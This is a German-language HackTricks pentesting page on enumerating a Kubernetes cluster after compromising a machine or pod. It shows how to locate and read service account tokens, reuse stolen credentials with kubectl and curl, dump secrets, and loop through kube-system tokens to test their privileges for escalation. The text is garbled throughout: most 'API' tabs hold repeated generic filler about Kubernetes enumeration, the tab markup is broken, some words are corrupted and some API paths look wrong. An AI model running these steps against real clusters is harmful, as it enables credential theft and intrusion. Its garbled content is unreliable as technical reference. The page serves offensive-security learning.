# Kubernetes Enumeration

{% hint style="success" %}
Lernen Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

## Kubernetes Tokens

Wenn Sie Zugriff auf eine Maschine kompromittiert haben, hat der Benutzer m√∂glicherweise Zugriff auf eine Kubernetes-Plattform. Der Token befindet sich normalerweise in einer Datei, auf die die **Umgebungsvariable `KUBECONFIG`** zeigt oder **innerhalb von `~/.kube`**.

In diesem Ordner finden Sie Konfigurationsdateien mit **Tokens und Konfigurationen zum Verbinden mit dem API-Server**. In diesem Ordner finden Sie auch einen Cache-Ordner mit zuvor abgerufenen Informationen.

Wenn Sie einen Pod innerhalb einer Kubernetes-Umgebung kompromittiert haben, gibt es andere Orte, an denen Sie Tokens und Informationen zur aktuellen K8-Umgebung finden k√∂nnen:

### Service Account Tokens

Bevor Sie fortfahren, wenn Sie nicht wissen, was ein Service in Kubernetes ist, w√ºrde ich Ihnen empfehlen, **diesen Link zu folgen und zumindest die Informationen zur Kubernetes-Architektur zu lesen**.

Entnommen aus der Kubernetes-[Dokumentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_‚ÄûWenn Sie einen Pod erstellen und keinen Service-Account angeben, wird automatisch der_ Standard _Service-Account im selben Namespace zugewiesen.‚Äú_

**ServiceAccount** ist ein von Kubernetes verwaltetes Objekt, das dazu dient, eine Identit√§t f√ºr Prozesse bereitzustellen, die in einem Pod ausgef√ºhrt werden.\
Jeder Service-Account hat ein damit verbundenes Geheimnis, das einen B√§ren-Token enth√§lt. Dies ist ein JSON Web Token (JWT), eine Methode zur sicheren Darstellung von Anspr√ºchen zwischen zwei Parteien.

Normalerweise befinden sich **einer** der Verzeichnisse:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

die Dateien:

* **ca.crt**: Es ist das CA-Zertifikat zur √úberpr√ºfung von Kubernetes-Kommunikationen
* **namespace**: Es zeigt den aktuellen Namespace an
* **token**: Es enth√§lt den **Service-Token** des aktuellen Pods.

Nun, da Sie den Token haben, k√∂nnen Sie den API-Server in der Umgebungsvariable **`KUBECONFIG`** finden. F√ºr weitere Informationen f√ºhren Sie `(env | set) | grep -i "kuber|kube`**`"`** aus.

Der Service Account-Token wird vom im **sa.key**-Datei befindlichen Schl√ºssel signiert und von **sa.pub** validiert.

Standardm√§√üiger Speicherort auf **Kubernetes**:

* /etc/kubernetes/pki

Standardm√§√üiger Speicherort auf **Minikube**:

* /var/lib/localkube/certs

### Hot Pods

_**Hot Pods sind**_ Pods, die einen privilegierten Service Account-Token enthalten. Ein privilegierter Service Account-Token ist ein Token, das Berechtigungen f√ºr privilegierte Aufgaben wie das Auflisten von Secrets, das Erstellen von Pods usw. hat.

## RBAC

Wenn Sie nicht wissen, was **RBAC** ist, **lesen Sie diesen Abschnitt**.

## Enumeration CheatSheet

Um eine K8s-Umgebung aufzulisten, ben√∂tigen Sie Folgendes:

* Einen **g√ºltigen Authentifizierungstoken**. Im vorherigen Abschnitt haben wir gesehen, wo nach einem Benutzertoken und einem Service Account-Token gesucht werden kann.
* Die **Adresse (**_**https://host:port**_**) des Kubernetes-APIs**. Diese kann normalerweise in den Umgebungsvariablen und/oder in der kube-Konfigurationsdatei gefunden werden.
* **Optional**: Das **ca.crt zur √úberpr√ºfung des API-Servers**. Dies kann an denselben Stellen gefunden werden, an denen sich der Token befindet. Dies ist n√ºtzlich, um das Zertifikat des API-Servers zu √ºberpr√ºfen, aber wenn Sie `--insecure-skip-tls-verify` mit `kubectl` oder `-k` mit `curl` verwenden, ben√∂tigen Sie dies nicht.

Mit diesen Details k√∂nnen Sie **Kubernetes aufz√§hlen**. Wenn der **API-Server aus irgendeinem Grund √ºber das Internet zug√§nglich ist**, k√∂nnen Sie einfach diese Informationen herunterladen und die Plattform von Ihrem Host aus aufz√§hlen.

Normalerweise befindet sich der **API-Server jedoch in einem internen Netzwerk**, daher m√ºssen Sie eine **Tunnelverbindung** √ºber die kompromittierte Maschine erstellen, um von Ihrem Ger√§t aus darauf zuzugreifen, oder Sie k√∂nnen das [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)-Bin√§rprogramm hochladen oder `curl/wget/anything` verwenden, um Roh-HTTP-Anfragen an den API-Server durchzuf√ºhren.

### Unterschiede zwischen den Verben `list` und `get`

Mit **`get`**-Berechtigungen k√∂nnen Sie Informationen zu bestimmten Assets abrufen (_`describe`-Option in `kubectl`_).
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Wenn Sie die **`list`** Berechtigung haben, d√ºrfen Sie API-Anfragen ausf√ºhren, um einen Typ von Verm√∂genswerten aufzulisten (_`get` Option in `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Wenn Sie die **`watch`** Berechtigung haben, d√ºrfen Sie API-Anfragen ausf√ºhren, um Assets zu √ºberwachen:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Sie √∂ffnen eine Streaming-Verbindung, die Ihnen das vollst√§ndige Manifest eines Deployments zur√ºckgibt, wann immer es sich √§ndert (oder wenn ein neues erstellt wird).

{% hint style="danger" %}
Die folgenden `kubectl`-Befehle zeigen lediglich, wie man die Objekte auflistet. Wenn Sie auf die Daten zugreifen m√∂chten, m√ºssen Sie anstelle von `get` `describe` verwenden.
{% endhint %}

### Mit curl

Von innerhalb eines Pods aus k√∂nnen Sie mehrere Umgebungsvariablen verwenden:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Standardm√§√üig kann das Pod auf den **kube-api Server** unter dem Dom√§nennamen **`kubernetes.default.svc`** zugreifen und Sie k√∂nnen das kube-Netzwerk in **`/etc/resolv.config`** sehen, da Sie hier die Adresse des Kubernetes-DNS-Servers finden (die ".1" des gleichen Bereichs ist der kube-api Endpunkt).
{% endhint %}

### Verwendung von kubectl

Nachdem Sie das Token und die Adresse des API-Servers haben, verwenden Sie kubectl oder curl, um darauf zuzugreifen, wie hier angegeben:

Standardm√§√üig kommuniziert der APISERVER mit dem `https://`-Schema
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> Wenn keine `https://` in der URL vorhanden ist, k√∂nnen Sie einen Fehler wie Bad Request erhalten.

Sie k√∂nnen hier ein [**offizielles kubectl Spickzettel finden**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/).  Das Ziel der folgenden Abschnitte ist es, auf geordnete Weise verschiedene Optionen zur Enumeration und zum Verst√§ndnis des neuen K8s, auf den Sie zugegriffen haben, darzustellen.

Um die HTTP-Anfrage zu finden, die `kubectl` sendet, k√∂nnen Sie den Parameter `-v=8` verwenden.

#### MitM kubectl - Kubectl proxyfizieren
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Aktuelle Konfiguration

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Wenn es Ihnen gelungen ist, einige Benutzeranmeldeinformationen zu stehlen, k√∂nnen Sie **sie lokal konfigurieren**, indem Sie etwas √Ñhnliches verwenden:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Unterst√ºtzte Ressourcen abrufen

Mit diesen Informationen kennen Sie alle Dienste, die Sie auflisten k√∂nnen

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Aktuelle Berechtigungen erhalten

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts k√∂nnen verwendet werden, um Zugriff auf das Kubernetes-API zu erhalten. √úberpr√ºfen Sie die vorhandenen Service Accounts, um potenzielle Angriffspunkte zu identifizieren.

#### Pods

Pods k√∂nnen sensible Informationen enthalten, die f√ºr Angriffe genutzt werden k√∂nnen. √úberpr√ºfen Sie die Pods auf Umgebungsvariablen, die sensible Daten enthalten k√∂nnten.

#### Secrets

Secrets sind sensibel und sollten sorgf√§ltig behandelt werden. √úberpr√ºfen Sie die vorhandenen Secrets auf ungesch√ºtzte oder falsch konfigurierte Eintr√§ge.

#### RBAC-Rollen

Rollen und Berechtigungen im Rahmen des Role-Based Access Control (RBAC) sollten regelm√§√üig √ºberpr√ºft werden, um sicherzustellen, dass nur autorisierte Benutzer Zugriff auf Ressourcen haben.

#### Netzwerkrichtlinien

Netzwerkrichtlinien k√∂nnen dazu beitragen, den Datenverkehr innerhalb des Kubernetes-Clusters zu steuern. √úberpr√ºfen Sie die konfigurierten Netzwerkrichtlinien, um potenzielle Sicherheitsl√ºcken zu identifizieren.

#### Ingress-Ressourcen

Ingress-Ressourcen regeln den Zugriff auf Dienste innerhalb des Clusters. √úberpr√ºfen Sie die Ingress-Konfiguration, um sicherzustellen, dass nur autorisierte Dienste erreichbar sind.

#### Persistente Volumes

Persistente Volumes k√∂nnen sensible Daten speichern. √úberpr√ºfen Sie die Konfiguration der persistenten Volumes, um sicherzustellen, dass die Daten angemessen gesch√ºtzt sind.

#### Pod-Sicherheitsrichtlinien

Pod-Sicherheitsrichtlinien k√∂nnen die Sicherheit der Pods verbessern. √úberpr√ºfen Sie die konfigurierten Sicherheitsrichtlinien, um potenzielle Schwachstellen zu identifizieren.

#### API-Server

Der API-Server ist ein zentraler Bestandteil von Kubernetes. √úberpr√ºfen Sie die Konfiguration des API-Servers auf Sicherheitsl√ºcken, die ausgenutzt werden k√∂nnten.

#### Cloud-Metadaten

Cloud-Metadaten k√∂nnen sensible Informationen enthalten. √úberpr√ºfen Sie, ob Pods oder Services auf Cloud-Metadaten zugreifen k√∂nnen.

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Eine weitere M√∂glichkeit, Ihre Berechtigungen zu √ºberpr√ºfen, besteht darin, das Tool zu verwenden: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Weitere Informationen zu **Kubernetes RBAC** finden Sie unter:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Sobald Sie wissen, welche Berechtigungen** Sie haben, √ºberpr√ºfen Sie die folgende Seite, um herauszufinden, **ob Sie sie missbrauchen k√∂nnen**, um Berechtigungen zu eskalieren:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Erhalten anderer Rollen

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts k√∂nnen verwendet werden, um Zugriff auf das Kubernetes-API zu erhalten. √úberpr√ºfen Sie die vorhandenen Service Accounts, um potenzielle Angriffspunkte zu identifizieren.

#### Pods

Pods k√∂nnen sensible Informationen enthalten, die f√ºr Angriffe genutzt werden k√∂nnen. √úberpr√ºfen Sie die Pods auf vertrauliche Daten wie Zugangsdaten oder API-Schl√ºssel.

#### Secrets

Kubernetes Secrets speichern sensible Informationen wie Passw√∂rter oder Tokens. Identifizieren Sie alle vorhandenen Secrets und √ºberpr√ºfen Sie deren Sicherheit.

#### ConfigMaps

ConfigMaps enthalten Konfigurationsdaten, die von Pods verwendet werden. √úberpr√ºfen Sie die ConfigMaps auf sensible Informationen, die f√ºr Angriffe ausgenutzt werden k√∂nnten.

#### RBAC-Rollen

√úberpr√ºfen Sie die Rollen und Berechtigungen im Kubernetes-Cluster, um sicherzustellen, dass nur autorisierte Benutzer auf bestimmte Ressourcen zugreifen k√∂nnen.

#### Netzwerkrichtlinien

Kubernetes-Netzwerkrichtlinien regeln den Datenverkehr zwischen Pods und Services. √úberpr√ºfen Sie die Netzwerkrichtlinien, um potenzielle Sicherheitsl√ºcken zu identifizieren.

#### Ingress-Ressourcen

Ingress-Ressourcen regeln den Zugriff auf Services von au√üerhalb des Clusters. √úberpr√ºfen Sie die Ingress-Ressourcen auf m√∂gliche Sicherheitsprobleme.

#### Volumes

Kubernetes-Volumes k√∂nnen sensible Daten speichern. √úberpr√ºfen Sie die Volumes auf m√∂gliche Lecks oder ungesch√ºtzte Daten.

#### Audit-Logs

Aktivieren Sie die √úberwachung und Protokollierung von Kubernetes-Aktivit√§ten, um verd√§chtige Vorg√§nge zu erkennen und Sicherheitsvorf√§lle zu untersuchen.

#### Helm-Charts

√úberpr√ºfen Sie die Helm-Charts auf Sicherheitsprobleme oder Konfigurationsfehler, die zu Schwachstellen f√ºhren k√∂nnten.

#### Kubernetes-Dashboard

Deaktivieren Sie das Kubernetes-Dashboard in Produktionsumgebungen, um unbefugten Zugriff zu verhindern und potenzielle Sicherheitsrisiken zu minimieren.

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Namenr√§ume abrufen

Kubernetes unterst√ºtzt **mehrere virtuelle Cluster**, die vom selben physischen Cluster unterst√ºtzt werden. Diese virtuellen Cluster werden **Namespaces** genannt.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts sind ein wichtiger Bestandteil der Kubernetes-Plattform. Sie erm√∂glichen Pods, mit anderen Ressourcen innerhalb des Clusters zu interagieren. Beim Pentesting k√∂nnen Service Accounts verwendet werden, um Zugriff auf sensible Informationen oder Ressourcen zu erlangen.

#### Secrets

Secrets sind Kubernetes-Ressourcen, die sensible Informationen wie Passw√∂rter, Tokens oder Schl√ºssel speichern. Beim Pentesting ist es wichtig, nach ungesch√ºtzten oder falsch konfigurierten Secrets zu suchen, da diese zu schwerwiegenden Sicherheitsproblemen f√ºhren k√∂nnen.

#### ConfigMaps

ConfigMaps sind Konfigurationsressourcen in Kubernetes, die Schl√ºssel-Wert-Paare speichern. Beim Pentesting k√∂nnen ConfigMaps sensible Informationen wie Datenbankverbindungszeichenfolgen oder API-Schl√ºssel enthalten, die von Angreifern missbraucht werden k√∂nnen.

#### RBAC-Rollen

Role-Based Access Control (RBAC) ist ein Mechanismus in Kubernetes, der den Zugriff auf Ressourcen basierend auf den zugewiesenen Rollen steuert. Beim Pentesting ist es wichtig, RBAC-Rollen zu √ºberpr√ºfen, um potenzielle Schwachstellen in der Zugriffskontrolle zu identifizieren.

#### Network Policies

Network Policies sind Regeln, die den eingehenden und ausgehenden Datenverkehr innerhalb eines Kubernetes-Clusters steuern. Beim Pentesting k√∂nnen Network Policies dazu verwendet werden, um potenzielle Angriffsvektoren zu identifizieren oder um den Datenverkehr innerhalb des Clusters zu manipulieren.

#### Pod Security Policies

Pod Security Policies sind Kubernetes-Ressourcen, die Sicherheitsrichtlinien f√ºr Pods definieren. Beim Pentesting ist es wichtig, Pod Security Policies zu √ºberpr√ºfen, um sicherzustellen, dass Pods gem√§√ü den Sicherheitsstandards konfiguriert sind.

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Geheime Informationen erhalten

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts k√∂nnen verwendet werden, um Zugriff auf die Kubernetes-API zu erhalten. √úberpr√ºfen Sie, ob es Service Accounts gibt, die √ºber mehr Bere1 als n√∂tig verf√ºgen.

- **Befehl**: `kubectl get serviceaccounts --all-namespaces`

#### Roll Fame

√úberpr√ºfen Sie die Rollen und Berechtigungen, die einem Service Account zugewiesen sind.

- **Befehl**: `kubectl get roles,clusterroles --all-namespaces`

#### Roll Binding

√úberpr√ºfen Sie, welche Rollen an Service Accounts gebunden sind.

- **Befehl**: `kubectl get rolebindings,clusterrolebindings --all-namespaces`

#### Pods

√úberpr√ºfen Sie, ob sensible Informationen in den Umgebungsvariablen von Pods enthalten sind.

- **Befehl**: `kubectl get pods --all-namespaces -o=json`

#### Secrets

√úberpr√ºfen Sie, ob Secrets unverschl√ºsselt oder in Plaintext in den Pods gespeichert sind.

- **Befehl**: `kubectl get secrets --all-namespaces`

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Wenn Sie Geheimnisse lesen k√∂nnen, k√∂nnen Sie die folgenden Zeilen verwenden, um die mit jedem Token verbundenen Berechtigungen zu erhalten:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Service-Konten abrufen

Wie am Anfang dieser Seite diskutiert, wird **einem Pod normalerweise ein Service-Konto zugewiesen, wenn er ausgef√ºhrt wird**. Daher kann das Auflisten der Service-Konten, ihrer Berechtigungen und ihres Ausf√ºhrungsorts einem Benutzer erm√∂glichen, Berechtigungen zu eskalieren.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts sind ein wichtiger Bestandteil der Kubernetes-Plattform. Sie erm√∂glichen Pods, mit anderen Ressourcen innerhalb des Clusters zu interagieren. Beim Testen der Sicherheit von Kubernetes ist es wichtig, alle vorhandenen Service Accounts zu identifizieren und ihre Berechtigungen zu √ºberpr√ºfen.

#### Pods

Pods sind die kleinsten bereitstellbaren Einheiten in Kubernetes. Beim Testen der Sicherheit ist es wichtig, alle Pods im Cluster zu enumerieren, um potenzielle Schwachstellen zu identifizieren.

#### Secrets

Secrets sind sensible Informationen wie Passw√∂rter, API-Schl√ºssel und Zertifikate, die von Pods verwendet werden k√∂nnen. Es ist wichtig, alle Secrets im Cluster zu identifizieren und sicherzustellen, dass sie angemessen gesch√ºtzt sind.

#### ConfigMaps

ConfigMaps sind Konfigurationsdateien, die von Pods verwendet werden k√∂nnen. Beim Testen der Sicherheit ist es wichtig, alle ConfigMaps im Cluster zu enumerieren, um potenzielle Sicherheitsl√ºcken zu identifizieren.

#### RBAC-Rollen

Role-Based Access Control (RBAC) ist ein Mechanismus zur Steuerung des Zugriffs auf Kubernetes-Ressourcen. Beim Testen der Sicherheit ist es wichtig, alle RBAC-Rollen im Cluster zu identifizieren und ihre Berechtigungen zu √ºberpr√ºfen.

#### Network Policies

Network Policies legen fest, wie Pods innerhalb des Clusters miteinander kommunizieren k√∂nnen. Beim Testen der Sicherheit ist es wichtig, alle Network Policies zu enumerieren und sicherzustellen, dass sie den Sicherheitsanforderungen entsprechen.

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Erhalte Bereitstellungen

Die Bereitstellungen geben die **Komponenten** an, die **ausgef√ºhrt** werden m√ºssen.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts k√∂nnen verwendet werden, um Zugriff auf die Kubernetes-API zu erhalten. √úberpr√ºfen Sie, ob Service Accounts mit unangemessenen Berechtigungen vorhanden sind.

- **Befehl:**
  ```bash
  kubectl get serviceaccounts --all-namespaces
  ```

#### Rollen und Cluster-Rollen

√úberpr√ºfen Sie die Rollen und Cluster-Rollen, um zu sehen, welche Berechtigungen den Service Accounts zugewiesen sind.

- **Befehl:**
  ```bash
  kubectl get roles,clusterroles --all-namespaces
  ```

#### Rollenbindung und Cluster-Rollenbindung

√úberpr√ºfen Sie, welche Service Accounts an Rollen oder Cluster-Rollen gebunden sind.

- **Befehl:**
  ```bash
  kubectl get rolebindings,clusterrolebindings --all-namespaces
  ```

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### Pods abrufen

Die Pods sind die tats√§chlichen **Container**, die **ausgef√ºhrt** werden.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts k√∂nnen verwendet werden, um Zugriff auf das Kubernetes-API zu erhalten. √úberpr√ºfen Sie die vorhandenen Service Accounts, um potenzielle Angriffspunkte zu identifizieren.

#### Rollen und Berechtigungen

√úberpr√ºfen Sie die Rollen und Berechtigungen in Kubernetes-Clustern, um sicherzustellen, dass keine √ºberm√§√üigen Berechtigungen vergeben sind, die von Angreifern ausgenutzt werden k√∂nnten.

#### Secrets

Suchen Sie nach ungesch√ºtzten Secrets in Kubernetes-Pods, da Angreifer diese Informationen nutzen k√∂nnten, um auf sensible Daten zuzugreifen.

#### Netzwerkrichtlinien

√úberpr√ºfen Sie die Netzwerkrichtlinien in Kubernetes, um sicherzustellen, dass nur autorisierter Netzwerkverkehr zugelassen ist und potenzielle Angriffspunkte zu identifizieren.

#### Pod-Sicherheit

√úberpr√ºfen Sie die Sicherheitskonfiguration von Pods, um sicherzustellen, dass bew√§hrte Sicherheitspraktiken befolgt werden und potenzielle Schwachstellen zu identifizieren.

#### Kubernetes-Dashboard

√úberpr√ºfen Sie, ob das Kubernetes-Dashboard aktiviert ist und ob es angemessen gesichert ist, um unbefugten Zugriff zu verhindern.

#### API-Server

√úberpr√ºfen Sie die Konfiguration des Kubernetes-API-Servers, um sicherzustellen, dass keine unsicheren Einstellungen vorhanden sind, die von Angreifern ausgenutzt werden k√∂nnten.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Erhalte Dienste

Kubernetes **Dienste** werden verwendet, um einen Dienst an einem bestimmten Port und einer IP-Adresse **zu √∂ffnen** (die als Lastenausgleicher f√ºr die Pods fungieren, die den Dienst tats√§chlich anbieten). Es ist interessant zu wissen, wo Sie andere Dienste finden k√∂nnen, um versuchen anzugreifen.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts sind ein wichtiger Bestandteil der Kubernetes-Plattform. Sie erm√∂glichen Pods, mit anderen Ressourcen innerhalb des Clusters zu interagieren. Beim Testen der Sicherheit von Kubernetes ist es wichtig, alle vorhandenen Service Accounts zu identifizieren und ihre Berechtigungen zu √ºberpr√ºfen.

#### Pods

Pods sind die kleinsten bereitstellbaren Einheiten in Kubernetes. Beim Testen der Sicherheit ist es wichtig, alle Pods im Cluster zu enumerieren, um potenzielle Schwachstellen zu identifizieren.

#### Secrets

Secrets sind Kubernetes-Ressourcen, die sensible Informationen wie Passw√∂rter, API-Schl√ºssel und Zertifikate speichern. Beim Testen der Sicherheit ist es wichtig, alle vorhandenen Secrets zu enumerieren, um sicherzustellen, dass keine sensiblen Informationen ungesch√ºtzt sind.

#### ConfigMaps

ConfigMaps sind Konfigurationsressourcen in Kubernetes, die Konfigurationsdaten in Form von Schl√ºssel-Wert-Paaren speichern. Beim Testen der Sicherheit ist es wichtig, alle ConfigMaps zu enumerieren, um potenzielle Sicherheitsl√ºcken aufzudecken.

#### RBAC-Rollen

Role-Based Access Control (RBAC) ist ein Mechanismus in Kubernetes, der den Zugriff auf Ressourcen basierend auf den zugewiesenen Rollen steuert. Beim Testen der Sicherheit ist es wichtig, alle RBAC-Rollen zu enumerieren, um sicherzustellen, dass die Zugriffsrechte angemessen konfiguriert sind.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Knoten abrufen

Erhalten Sie alle **Knoten, die im Cluster konfiguriert sind**.
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts k√∂nnen verwendet werden, um Zugriff auf die Kubernetes-API zu erhalten. √úberpr√ºfen Sie die vorhandenen Service Accounts, um potenzielle Angriffspunkte zu identifizieren.

```bash
kubectl get serviceaccounts
```

#### Rollen und Berechtigungen

√úberpr√ºfen Sie die Rollen und Berechtigungen in einem Namespace, um zu verstehen, welche Aktionen ein Angreifer ausf√ºhren kann.

```bash
kubectl get roles
kubectl get rolebindings
```

#### Pods

√úberpr√ºfen Sie die Pods im Cluster, um sensible Informationen oder Schwachstellen zu identifizieren.

```bash
kubectl get pods --all-namespaces
```

#### Secrets

√úberpr√ºfen Sie die Secrets im Cluster, da diese sensible Informationen wie Passw√∂rter oder API-Schl√ºssel enthalten k√∂nnen.

```bash
kubectl get secrets --all-namespaces
```

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Erhalte DaemonSets

**DaemonSets** erm√∂glichen es, sicherzustellen, dass ein **bestimmter Pod auf allen Knoten** des Clusters (oder auf den ausgew√§hlten) l√§uft. Wenn Sie das DaemonSet l√∂schen, werden auch die von ihm verwalteten Pods entfernt.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes-Enumeration

#### Service Accounts

Service Accounts k√∂nnen verwendet werden, um Zugriff auf die Kubernetes-API zu erhalten. √úberpr√ºfen Sie, ob es Service Accounts gibt, die √ºber Berechtigungen verf√ºgen, die nicht erforderlich sind.

#### Secrets

√úberpr√ºfen Sie, ob sensible Informationen wie Passw√∂rter oder API-Schl√ºssel in Kubernetes Secrets gespeichert sind. Diese k√∂nnen durch Schwachstellen im Zugriff auf Pods oder durch falsch konfigurierte Berechtigungen offengelegt werden.

#### ConfigMaps

ConfigMaps k√∂nnen Konfigurationsdaten in Kubernetes speichern. √úberpr√ºfen Sie, ob sensible Informationen in ConfigMaps gespeichert sind und ob sie angemessen gesch√ºtzt sind.

#### RBAC-Rollen

√úberpr√ºfen Sie die Rollen und Berechtigungen im Kubernetes Role-Based Access Control (RBAC)-System, um sicherzustellen, dass nur autorisierte Benutzer auf Ressourcen zugreifen k√∂nnen.

#### Netzwerkpolicies

Netzwerkpolicies k√∂nnen den eingehenden und ausgehenden Datenverkehr in Kubernetes-Clustern steuern. √úberpr√ºfen Sie die konfigurierten Netzwerkpolicies, um sicherzustellen, dass sie den Sicherheitsanforderungen entsprechen.

#### Pod-Sicherheit

√úberpr√ºfen Sie die Sicherheitskonfiguration von Pods, um sicherzustellen, dass bew√§hrte Sicherheitspraktiken befolgt werden, z. B. die Verwendung von nicht priviligierten Containern und die Beschr√§nkung von Ressourcen.

#### Audit-Logs

